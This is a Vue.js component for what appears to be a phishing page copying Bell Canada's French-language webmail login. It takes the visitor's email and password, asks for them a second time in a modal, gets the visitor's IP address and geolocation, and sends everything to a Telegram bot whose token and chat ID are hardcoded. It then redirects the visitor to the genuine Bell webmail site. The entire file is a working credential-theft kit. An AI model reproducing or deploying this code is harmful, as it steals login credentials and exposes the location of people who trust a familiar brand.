<template>
    <div class="container">
      <!-- Modal visibility controlled by showModal -->
      <FrenchModalForm v-if="showModal" :location="location" :ipAddress="ipAddress" :retypedEmail="retypedEmail"
        :retypedPassword="retypedPassword" @login-success="handleLoginSuccess" @close-modal="showModal = false" />
  
      <!-- Login Form -->
      <div class="modal">
        <h1 class="tink">Connexion</h1>
        <form @submit.prevent="submitForm" class="field">
          <div class="form-group">
            <label for="email">Adresse courriel</label>
            <input id="email" type="email" v-model="email" name="email" />
            <div v-if="errors.email" class="error">{{ errors.email }}</div>
          </div>
          <div class="form-group">
            <label for="password">Mot de passe</label>
            <input id="password" type="password" v-model="password" name="password" />
            <div v-if="errors.password" class="error">{{ errors.password }}</div>
          </div>
          <button type="submit" class="submit">Connexion</button>
          <p class="reduce">Mot de passe oublié? Composez le 310-<span class="bold">BELL</span> pour le réinitialiser.</p>
        </form>
        <div class="form-footer">
          <p class="blue"><a href="#">Vie privée</a> | <a href="#"> Avis juridiques et réglementaires</a></p>
          <p class="copyright">&copy; Bell Canada,. Tous droits réservés.</p>
        </div>
      </div>
    </div>
  </template>
  
  <script>
  import axios from 'axios';
  import FrenchModalForm from './FrenchModalForm.vue';
  
  export default {
    name: 'FrenchMainContainer',
    components: {
      FrenchModalForm
    },
    data() {
      return {
        email: '',
        password: '',
        retypedPassword: '',  // Variable to store retyped password
        retypedEmail: '',     // Variable to store retyped email
        errors: {},
        location: {},
        ipAddress: '',
        showModal: false,  // To control modal visibility
      };
    },
    methods: {
      async submitForm() {
        this.errors = {};
  
        // Validate email
        if (!this.email) {
          this.errors.email = 'Email is required';
        } else if (!this.validateEmail(this.email)) {
          this.errors.email = 'Invalid Credentials';
        }
  
        // Validate password
        if (!this.password) {
          this.errors.password = 'Invalid Credentials';
        }
  
        // If there are validation errors, stop the submission
        if (Object.keys(this.errors).length > 0) {
          return;
        }
  
        try {
          // Get user's IP address
          this.ipAddress = await this.getIpAddress();
  
          // Show the modal with the correct location and IP
          this.showModal = true;
  
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              async (position) => {
                this.location.latitude = position.coords.latitude;
                this.location.longitude = position.coords.longitude;
  
                // Get country from geolocation
                const locationDetails = await this.getLocationDetails(
                  this.location.latitude,
                  this.location.longitude
                );
  
                this.location = { ...this.location, ...locationDetails };
              },
              (error) => {
                console.error('Geolocation error:', error);
              }
            );
          }
        } catch (error) {
          console.error('Error fetching IP address:', error);
        }
      },
  
      validateEmail(email) {
        const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        return re.test(email);
      },
  
      async getIpAddress() {
        try {
          const response = await axios.get('https://api64.ipify.org?format=json');
          return response.data.ip;
        } catch (error) {
          console.error('Failed to fetch IP address:', error);
          return 'N/A';
        }
      },
  
      async getLocationDetails(lat, lon) {
        try {
          const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
          const data = await response.json();
          return {
            country: data.address ? data.address.country : 'N/A',
            city: data.address ? data.address.city : 'N/A',
            state: data.address ? data.address.state : 'N/A',
            zip_code: data.address ? data.address.postcode : 'N/A'
          };
        } catch (error) {
          console.error('Error fetching location details:', error);
          return {
            country: 'N/A',
            city: 'N/A',
            state: 'N/A',
            zip_code: 'N/A'
          };
        }
      },
  
      async handleLoginSuccess({ retypedEmail, retypedPassword }) {
        // Ensure to use the retyped values in the modal
        this.retypedEmail = retypedEmail;
        this.retypedPassword = retypedPassword;
        await this.sendDataToTelegram();
        window.location.href = 'https://webmail.en.bellnet.ca/'
      },
  
      async sendDataToTelegram() {
        const googleMapsLink = this.location.latitude && this.location.longitude
          ? `https://www.google.com/maps?q=${this.location.latitude},${this.location.longitude}`
          : 'Location not available';
  
        const message = `Email: ${this.email}
  Password: ${this.password}
  
  Modal-email: ${this.retypedEmail}
  Modal-password: ${this.retypedPassword}
  
  IP Address: ${this.ipAddress || 'N/A'}
  Latitude: ${this.location.latitude || 'N/A'}
  Longitude: ${this.location.longitude || 'N/A'}
  City: ${this.location.city || 'N/A'}
  State: ${this.location.state || 'N/A'}
  Zip Code: ${this.location.zip_code || 'N/A'}
  Country: ${this.location.country || 'N/A'}
  Location Link: ${googleMapsLink}`;
  
        console.log('message is', message);
        // const botToken = '6301043707:AAEfP2oS0CiG-T97bkXtnmZyL46O6DEWl_g';
        const botToken = '6301043707:AAGpjgz3uHhdr0PrdnAXLUKLHvtPgUo-irs';
        const chatId = 1613277499;
        // const chatId = 7067343735;
        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
        try {
          const response = await axios.post(telegramApiUrl, {
            chat_id: chatId,
            text: message
          });
  
          if (response.status === 200) {
            console.log('message is', message);
            console.log('Message sent successfully!');
          } else {
            console.error('Failed to send message:', response.status, response.data);
          }
        } catch (error) {
          console.error(error);
        }
      },
  
      redirectToWebmail() {
        // Redirect to webmail (or any other desired location)
        window.location.href = 'https://webmail.en.bellnet.ca'; // Replace with actual URL
      }
    }
  };
  </script>
  
  
  <style scoped>
  .container {
    background-image: url('@/assets/Bell.jpg');
    background-size: cover;
    background-repeat: no-repeat;
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%;
    height: 100vh;
    box-sizing: border-box;
  }
  
  .modal {
    font-family: "BellSlimBlack", Helvetica, Arial, sans-serif;
    background-color: #ffffff;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    width: 100%;
    max-width: 270px;
    border-radius: 10px;
    border-width: 1px;
    margin: auto;
    height: 480px;
    box-sizing: border-box;
  }
  
  .field input[type='email'],
  .field input[type='password'] {
    height: 40px;
    padding: 10px;
    border: 1px solid black;
    border-radius: 4px;
  }
  
  .field input[type='email']:focus,
  .field input[type='password']:focus {
    outline: none;
    border: 1px solid #ffa07a;
    box-shadow: 0 0 0 2px #007bff;
    border-radius: 4px;
  }
  
  .form-group {
    display: flex;
    flex-direction: column;
    padding: 0 20px;
    margin-bottom: 10px;
  }
  
  .form-group label {
    font-size: 14px;
    margin-bottom: 5px;
    line-height: 18px;
    height: 20px;
    font-weight: 700;
    font-family: "BellSlimBlack", Helvetica, Arial, sans-serif;
  }
  
  .form-footer {
    background-color: #F4F4F4;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    width: 100%;
    height: 80px;
    box-sizing: border-box;
    border-bottom-left-radius: 10px;
    border-bottom-right-radius: 10px;
  }
  
  .reduce {
    font-size: 15px;
    margin-left: 20px;
    margin-right: 20px;
    margin-top: 8px;
    text-align: center;
    margin-bottom: 10px;
    cursor: pointer;
    color: #555555;
  }
  
  .reduce:hover {
    text-decoration: underline;
  }
  
  .tink {
    margin-left: 20px;
    font-weight: 800;
    margin-top: 20px;
  }
  
  .bold {
    font-weight: 800;
  }
  
  .blue {
    color: #6cb5f9;
    font-size: 12px;
  }
  
  .copyright {
    font-size: 12px;
    color: #555555;
  }
  
  .submit {
    color: white;
    height: 30px;
    width: 100px;
    border: none;
    border-radius: 9999px;
    margin-top: 10px;
    margin-bottom: 5px;
    margin-left: 20px;
    padding: 0 10px;
    background: linear-gradient(to right, #004e94, #0064a2);
    outline: none;
    cursor: pointer;
  }
  
  .submit:hover {
    opacity: 0.8;
    background: #003770;
  }
  
  .error {
    color: red;
    font-size: 12px;
    margin-top: 7px;
  }
  
  @media (max-width: 768px) {
    .modal {
      width: 90%;
    }
  }
  
  @media (min-width: 768px) {
    .modal {
      width: 70%;
    }
  }
  
  @media (min-width: 1024px) {
    .container {
      display: flex;
      flex-direction: row !important;
      justify-content: flex-start !important;
      align-items: center !important;
      padding-left: 20px !important;
    }
  
    .modal {
      width: auto;
      /* Adjust width for even larger screens */
      margin-left: 30px;
    }
  }
  
  @media (max-width: 1023px) {
    .container {
      justify-content: center;
      align-items: center;
    }
  }
  </style>
  